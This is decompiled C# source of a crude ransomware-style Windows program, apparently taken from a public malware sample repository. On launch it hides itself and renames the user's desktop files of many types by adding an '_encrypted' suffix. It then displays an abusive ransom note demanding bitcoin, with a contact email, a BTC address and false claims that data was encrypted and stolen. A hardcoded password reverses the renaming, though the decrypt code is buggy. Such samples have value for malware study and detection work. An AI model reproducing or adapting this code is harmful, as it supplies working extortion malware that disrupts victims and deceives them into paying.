// Decompiled with JetBrains decompiler
// Type: WindowsApp24.Form1
// Assembly: c, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 67534E14-D08A-477D-868A-765D18E94DA4
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.06\HEUR-Trojan-Ransom.MSIL.Crypren.gen-cd41ed86dd2b59459c6e241c5ab3d210f8bd6f12129c1ff838c7d1557797bd40.exe

using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using System;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Runtime.CompilerServices;
using System.Threading;
using System.Windows.Forms;

namespace WindowsApp24
{
  [DesignerGenerated]
  public class Form1 : Form
  {
    private string strmsg;
    private int i;
    private IContainer components;

    public Form1()
    {
      this.Load += new EventHandler(this.Form1_Load);
      this.InitializeComponent();
    }

    private void renameTxTInFolder()
    {
      string str = Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + "\\";
      string searchPattern = "*.txt";
      string[] files = Directory.GetFiles(str, searchPattern, SearchOption.AllDirectories);
      int index = 0;
      while (index < files.Length)
      {
        string path2 = files[index];
        File.Move(Path.Combine(str, path2), Path.Combine(str, path2 + "_encrypted"));
        checked { ++index; }
      }
    }

    private void renameRaRInFolder()
    {
      string str = Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + "\\";
      string searchPattern = "*.rar";
      string[] files = Directory.GetFiles(str, searchPattern, SearchOption.AllDirectories);
      int index = 0;
      while (index < files.Length)
      {
        string path2 = files[index];
        File.Move(Path.Combine(str, path2), Path.Combine(str, path2 + "_encrypted"));
        checked { ++index; }
      }
    }

    private void renameLnKInFolder()
    {
      string str = Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + "\\";
      string searchPattern = "*.lnk";
      string[] files = Directory.GetFiles(str, searchPattern, SearchOption.AllDirectories);
      int index = 0;
      while (index < files.Length)
      {
        string path2 = files[index];
        File.Move(Path.Combine(str, path2), Path.Combine(str, path2 + "_encrypted"));
        checked { ++index; }
      }
    }

    private void renameUrLInFolder()
    {
      string str = Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + "\\";
      string searchPattern = "*.url";
      string[] files = Directory.GetFiles(str, searchPattern, SearchOption.AllDirectories);
      int index = 0;
      while (index < files.Length)
      {
        string path2 = files[index];
        File.Move(Path.Combine(str, path2), Path.Combine(str, path2 + "_encrypted"));
        checked { ++index; }
      }
    }

    private void renameZiPInFolder()
    {
      string str = Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + "\\";
      string searchPattern = "*.zip";
      string[] files = Directory.GetFiles(str, searchPattern, SearchOption.AllDirectories);
      int index = 0;
      while (index < files.Length)
      {
        string path2 = files[index];
        File.Move(Path.Combine(str, path2), Path.Combine(str, path2 + "_encrypted"));
        checked { ++index; }
      }
    }

    private void renamePdFInFolder()
    {
      string str = Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + "\\";
      string searchPattern = "*.pdf";
      string[] files = Directory.GetFiles(str, searchPattern, SearchOption.AllDirectories);
      int index = 0;
      while (index < files.Length)
      {
        string path2 = files[index];
        File.Move(Path.Combine(str, path2), Path.Combine(str, path2 + "_encrypted"));
        checked { ++index; }
      }
    }

    private void renamePNGInFolder()
    {
      string str = Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + "\\";
      string searchPattern = "*.png";
      string[] files = Directory.GetFiles(str, searchPattern, SearchOption.AllDirectories);
      int index = 0;
      while (index < files.Length)
      {
        string path2 = files[index];
        File.Move(Path.Combine(str, path2), Path.Combine(str, path2 + "_encrypted"));
        checked { ++index; }
      }
    }

    private void renameJPGInFolder()
    {
      string str = Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + "\\";
      string searchPattern = "*.jpg";
      string[] files = Directory.GetFiles(str, searchPattern, SearchOption.AllDirectories);
      int index = 0;
      while (index < files.Length)
      {
        string path2 = files[index];
        File.Move(Path.Combine(str, path2), Path.Combine(str, path2 + "_encrypted"));
        checked { ++index; }
      }
    }

    private void renameJPEGInFolder()
    {
      string str = Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + "\\";
      string searchPattern = "*.jpeg";
      string[] files = Directory.GetFiles(str, searchPattern, SearchOption.AllDirectories);
      int index = 0;
      while (index < files.Length)
      {
        string path2 = files[index];
        File.Move(Path.Combine(str, path2), Path.Combine(str, path2 + "_encrypted"));
        checked { ++index; }
      }
    }

    private void renameRTFInFolder()
    {
      string str = Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + "\\";
      string searchPattern = "*.rtf";
      string[] files = Directory.GetFiles(str, searchPattern, SearchOption.AllDirectories);
      int index = 0;
      while (index < files.Length)
      {
        string path2 = files[index];
        File.Move(Path.Combine(str, path2), Path.Combine(str, path2 + "_encrypted"));
        checked { ++index; }
      }
    }

    private void renamedocxInFolder()
    {
      string str = Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + "\\";
      string searchPattern = "*.docx";
      string[] files = Directory.GetFiles(str, searchPattern, SearchOption.AllDirectories);
      int index = 0;
      while (index < files.Length)
      {
        string path2 = files[index];
        File.Move(Path.Combine(str, path2), Path.Combine(str, path2 + "_encrypted"));
        checked { ++index; }
      }
    }

    private void Form1_Load(object sender, EventArgs e)
    {
      this.GroupBox1.Visible = false;
      this.Visible = false;
      this.ShowInTaskbar = false;
      Thread.Sleep(Conversions.ToInteger("5000"));
      this.renameTxTInFolder();
      this.renameJPEGInFolder();
      this.renameJPGInFolder();
      this.renameLnKInFolder();
      this.renamePdFInFolder();
      this.renamePNGInFolder();
      this.renameRaRInFolder();
      this.renameRTFInFolder();
      this.renameUrLInFolder();
      this.renameZiPInFolder();
      this.Visible = true;
      this.TopMost = true;
      this.strmsg = "Your files have been ecrypted with ransomware 256 bits encrypt secure sssl alorithm rot13..:" + Environment.NewLine + "your personil file have downloaded into my secure server buletprof. every important,borwser, cookes, games..." + Environment.NewLine + "i can restored you file open if you payed." + Environment.NewLine + " i encrypted files you can not open due ssl encrypt rot13 aes rijindael anlgorithm miltary file." + Environment.NewLine + Environment.NewLine + "how to restored my files back??" + Environment.NewLine + "and i will erase form my server jpg txt all externsion file secure shred wipe full double method." + Environment.NewLine + "email infornmatioen cotact dfercvypt files rot13 back nromal:" + Environment.NewLine + "my mail inqueres: crypt130@sharklasers.com" + Environment.NewLine + "cherk btc tarnseaction: 112Wz7NRWEMJC8jZv9Q3ru6xVBJjg8TRdD" + Environment.NewLine + "serach the btc into mail aders dectpyion software will sent on youmail perosnal." + Environment.NewLine + Environment.NewLine + "if you can turn pc of it will come back u fuck bithc no easpcae" + Environment.NewLine + "reemember your file encrypnt by me....." + Environment.NewLine + "contaoct to me th e decytpon price decrypt file price amount for btc wallet encrypt transacton " + Environment.NewLine + "i secrypt cheap for youu other is espensive do not pay other!!!...." + Environment.NewLine + " contact us. fast?" + Environment.NewLine + " negotiaite price: crypt130@sharklasers.com " + Environment.NewLine + Environment.NewLine + "If yuo not deside to pay ranson .faiel wl be shared deep web dark web hacker" + Environment.NewLine + "do you knouw tor?? is dep web aces avoid censoreship by all" + Environment.NewLine + "hacker sharcerdit card info and paswored and  bankging info" + Environment.NewLine + "quick!! paym now for files be erased secure secure removed from our server buletprof" + Environment.NewLine + "we ar kind with ofer wil notkeep you files forever if paeyd";
      this.Timer1.Enabled = true;
    }

    private void Timer1_Tick(object sender, EventArgs e)
    {
      // ISSUE: variable of a reference type
      int& local;
      // ISSUE: explicit reference operation
      int num = checked (^(local = ref this.i) + 1);
      local = num;
      Label label1;
      string str = (label1 = this.Label1).Text + this.strmsg.Substring(checked (this.i - 1), 1);
      label1.Text = str;
      if (this.i != this.strmsg.Length)
        return;
      this.Timer1.Enabled = false;
      this.GroupBox1.Visible = true;
    }

    private void Label2_Click(object sender, EventArgs e)
    {
    }

    private void Button2_Click(object sender, EventArgs e)
    {
      if (Operators.CompareString(this.TextBox1.Text, "Pass", false) == 0)
      {
        int num1 = (int) Interaction.MsgBox((object) "Corect you must check decypt button it wuill decyrpt fiels for ");
        int num2 = (int) Interaction.MsgBox((object) "clcik the decyrpt buton now got started decytped files");
      }
      else
      {
        int num = (int) Interaction.MsgBox((object) "WARNGING wrong pasword");
      }
    }

    private void Button1_Click(object sender, EventArgs e)
    {
      if (Operators.CompareString(this.TextBox1.Text, "Pass", false) != 0)
        return;
      int num = (int) Interaction.MsgBox((object) "do not close, decrypt is happening. wait unttil");
      this.decryptdocxInFolder();
      this.decryptJPEGInFolder();
      this.decryptLnKInFolder();
      this.decryptPdFInFolder();
      this.decryptPNGInFolder();
      this.decryptRaRInFolder();
      this.decryptRTFInFolder();
      this.decryptTxTInFolder();
      this.decryptUrLInFolder();
      this.decryptZiPInFolder();
      Application.Exit();
    }

    private void decryptTxTInFolder()
    {
      string str = Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + "\\";
      string searchPattern = "*.txt_encrypted";
      string[] files = Directory.GetFiles(str, searchPattern, SearchOption.AllDirectories);
      int index = 0;
      while (index < files.Length)
      {
        string path2 = files[index];
        File.Move(Path.Combine(str, path2), Path.Combine(str, path2 + ".txt"));
        checked { ++index; }
      }
    }

    private void decryptRaRInFolder()
    {
      string str = Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + "\\";
      string searchPattern = "*.rar_encrypted";
      string[] files = Directory.GetFiles(str, searchPattern, SearchOption.AllDirectories);
      int index = 0;
      while (index < files.Length)
      {
        string path2 = files[index];
        File.Move(Path.Combine(str, path2), Path.Combine(str, path2 + ".rar"));
        checked { ++index; }
      }
    }

    private void decryptLnKInFolder()
    {
      string str = Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + "\\";
      string searchPattern = "*.lnk_encrypted";
      string[] files = Directory.GetFiles(str, searchPattern, SearchOption.AllDirectories);
      int index = 0;
      while (index < files.Length)
      {
        string path2 = files[index];
        File.Move(Path.Combine(str, path2), Path.Combine(str, path2 + ".lnk"));
        checked { ++index; }
      }
    }

    private void decryptUrLInFolder()
    {
      string str = Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + "\\";
      string searchPattern = "*.url_encrypted";
      string[] files = Directory.GetFiles(str, searchPattern, SearchOption.AllDirectories);
      int index = 0;
      while (index < files.Length)
      {
        string path2 = files[index];
        File.Move(Path.Combine(str, path2), Path.Combine(str, path2 + ".url"));
        checked { ++index; }
      }
    }

    private void decryptZiPInFolder()
    {
      string str = Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + "\\";
      string searchPattern = "*.zip_encrypted";
      string[] files = Directory.GetFiles(str, searchPattern, SearchOption.AllDirectories);
      int index = 0;
      while (index < files.Length)
      {
        string path2 = files[index];
        File.Move(Path.Combine(str, path2), Path.Combine(str, path2 + ".zip"));
        checked { ++index; }
      }
    }

    private void decryptPdFInFolder()
    {
      string str = Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + "\\";
      string searchPattern = "*.pdf_encrypted";
      string[] files = Directory.GetFiles(str, searchPattern, SearchOption.AllDirectories);
      int index = 0;
      while (index < files.Length)
      {
        string path2 = files[index];
        File.Move(Path.Combine(str, path2), Path.Combine(str, path2 + ".pdf"));
        checked { ++index; }
      }
    }

    private void decryptPNGInFolder()
    {
      string str = Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + "\\";
      string searchPattern = "*.png_encrypted";
      string[] files = Directory.GetFiles(str, searchPattern, SearchOption.AllDirectories);
      int index = 0;
      while (index < files.Length)
      {
        string path2 = files[index];
        File.Move(Path.Combine(str, path2), Path.Combine(str, path2 + ".png"));
        checked { ++index; }
      }
    }

    private void decryptJPGInFolder()
    {
      string str = Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + "\\";
      string searchPattern = "*.jpg_encrypted";
      string[] files = Directory.GetFiles(str, searchPattern, SearchOption.AllDirectories);
      int index = 0;
      while (index < files.Length)
      {
        string path2 = files[index];
        File.Move(Path.Combine(str, path2), Path.Combine(str, path2 + ".jpg"));
        checked { ++index; }
      }
    }

    private void decryptJPEGInFolder()
    {
      string str = Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + "\\";
      string searchPattern = "*.jpeg_encrypted";
      string[] files = Directory.GetFiles(str, searchPattern, SearchOption.AllDirectories);
      int index = 0;
      while (index < files.Length)
      {
        string path2 = files[index];
        File.Move(Path.Combine(str, path2), Path.Combine(str, path2 + ".jpeg"));
        checked { ++index; }
      }
    }

    private void decryptRTFInFolder()
    {
      string str = Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + "\\";
      string searchPattern = "*.rtf_encrypted";
      string[] files = Directory.GetFiles(str, searchPattern, SearchOption.AllDirectories);
      int index = 0;
      while (index < files.Length)
      {
        string path2 = files[index];
        File.Move(Path.Combine(str, path2), Path.Combine(str, path2 + ".rtf"));
        checked { ++index; }
      }
    }

    private void decryptdocxInFolder()
    {
      string str = Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + "\\";
      string searchPattern = "*.docx_encrypted";
      string[] files = Directory.GetFiles(str, searchPattern, SearchOption.AllDirectories);
      int index = 0;
      while (index < files.Length)
      {
        string path2 = files[index];
        File.Move(Path.Combine(str, path2), Path.Combine(str, path2 + ".docx"));
        checked { ++index; }
      }
    }

    [DebuggerNonUserCode]
    protected override void Dispose(bool disposing)
    {
      try
      {
        if (!disposing || this.components == null)
          return;
        this.components.Dispose();
      }
      finally
      {
        base.Dispose(disposing);
      }
    }

    [DebuggerStepThrough]
    private void InitializeComponent()
    {
      this.components = (IContainer) new System.ComponentModel.Container();
      ComponentResourceManager componentResourceManager = new ComponentResourceManager(typeof (Form1));
      this.Timer1 = new System.Windows.Forms.Timer(this.components);
      this.Label1 = new Label();
      this.Button1 = new Button();
      this.Button2 = new Button();
      this.GroupBox1 = new GroupBox();
      this.TextBox1 = new TextBox();
      this.Timer2 = new System.Windows.Forms.Timer(this.components);
      this.NotifyIcon1 = new NotifyIcon(this.components);
      this.GroupBox1.SuspendLayout();
      this.SuspendLayout();
      this.Timer1.Interval = 1;
      this.Label1.AutoSize = true;
      this.Label1.BackColor = Color.Transparent;
      this.Label1.Font = new Font("Microsoft Sans Serif", 8.25f, FontStyle.Bold, GraphicsUnit.Point, (byte) 0);
      this.Label1.ForeColor = Color.Lime;
      this.Label1.Location = new Point(12, 9);
      this.Label1.Name = "Label1";
      this.Label1.Size = new Size(0, 13);
      this.Label1.TabIndex = 0;
      this.Button1.BackColor = Color.Red;
      this.Button1.FlatStyle = FlatStyle.System;
      this.Button1.Location = new Point(83, 45);
      this.Button1.Name = "Button1";
      this.Button1.Size = new Size(75, 23);
      this.Button1.TabIndex = 2;
      this.Button1.Text = "ddecrpy";
      this.Button1.UseVisualStyleBackColor = false;
      this.Button2.BackColor = Color.Red;
      this.Button2.FlatStyle = FlatStyle.System;
      this.Button2.Location = new Point(6, 45);
      this.Button2.Name = "Button2";
      this.Button2.Size = new Size(75, 23);
      this.Button2.TabIndex = 3;
      this.Button2.Text = " check";
      this.Button2.UseVisualStyleBackColor = false;
      this.GroupBox1.Controls.Add((Control) this.TextBox1);
      this.GroupBox1.Controls.Add((Control) this.Button2);
      this.GroupBox1.Controls.Add((Control) this.Button1);
      this.GroupBox1.ForeColor = Color.White;
      this.GroupBox1.Location = new Point(569, 240);
      this.GroupBox1.Name = "GroupBox1";
      this.GroupBox1.Size = new Size(165, 74);
      this.GroupBox1.TabIndex = 4;
      this.GroupBox1.TabStop = false;
      this.GroupBox1.Text = "ransonware decyptt";
      this.TextBox1.Location = new Point(6, 19);
      this.TextBox1.Name = "TextBox1";
      this.TextBox1.Size = new Size(152, 20);
      this.TextBox1.TabIndex = 4;
      this.NotifyIcon1.Icon = (Icon) componentResourceManager.GetObject("NotifyIcon1.Icon");
      this.NotifyIcon1.Text = "NotifyIcon1";
      this.NotifyIcon1.Visible = true;
      this.AutoScaleDimensions = new SizeF(6f, 13f);
      this.AutoScaleMode = AutoScaleMode.Font;
      this.BackColor = Color.Black;
      this.ClientSize = new Size(746, 326);
      this.ControlBox = false;
      this.Controls.Add((Control) this.GroupBox1);
      this.Controls.Add((Control) this.Label1);
      this.FormBorderStyle = FormBorderStyle.FixedSingle;
      this.Icon = (Icon) componentResourceManager.GetObject("$this.Icon");
      this.MaximizeBox = false;
      this.MinimizeBox = false;
      this.Name = nameof (Form1);
      this.StartPosition = FormStartPosition.CenterScreen;
      this.Text = "h";
      this.GroupBox1.ResumeLayout(false);
      this.GroupBox1.PerformLayout();
      this.ResumeLayout(false);
      this.PerformLayout();
    }

    internal virtual System.Windows.Forms.Timer Timer1
    {
      get => this._Timer1;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        EventHandler eventHandler = new EventHandler(this.Timer1_Tick);
        System.Windows.Forms.Timer timer1_1 = this._Timer1;
        if (timer1_1 != null)
          timer1_1.Tick -= eventHandler;
        this._Timer1 = value;
        System.Windows.Forms.Timer timer1_2 = this._Timer1;
        if (timer1_2 == null)
          return;
        timer1_2.Tick += eventHandler;
      }
    }

    [field: AccessedThroughProperty("Label1")]
    internal virtual Label Label1 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

    internal virtual Button Button1
    {
      get => this._Button1;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        EventHandler eventHandler = new EventHandler(this.Button1_Click);
        Button button1_1 = this._Button1;
        if (button1_1 != null)
          button1_1.Click -= eventHandler;
        this._Button1 = value;
        Button button1_2 = this._Button1;
        if (button1_2 == null)
          return;
        button1_2.Click += eventHandler;
      }
    }

    internal virtual Button Button2
    {
      get => this._Button2;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        EventHandler eventHandler = new EventHandler(this.Button2_Click);
        Button button2_1 = this._Button2;
        if (button2_1 != null)
          button2_1.Click -= eventHandler;
        this._Button2 = value;
        Button button2_2 = this._Button2;
        if (button2_2 == null)
          return;
        button2_2.Click += eventHandler;
      }
    }

    [field: AccessedThroughProperty("GroupBox1")]
    internal virtual GroupBox GroupBox1 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

    [field: AccessedThroughProperty("TextBox1")]
    internal virtual TextBox TextBox1 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

    [field: AccessedThroughProperty("Timer2")]
    internal virtual System.Windows.Forms.Timer Timer2 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

    [field: AccessedThroughProperty("NotifyIcon1")]
    internal virtual NotifyIcon NotifyIcon1 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }
  }
}
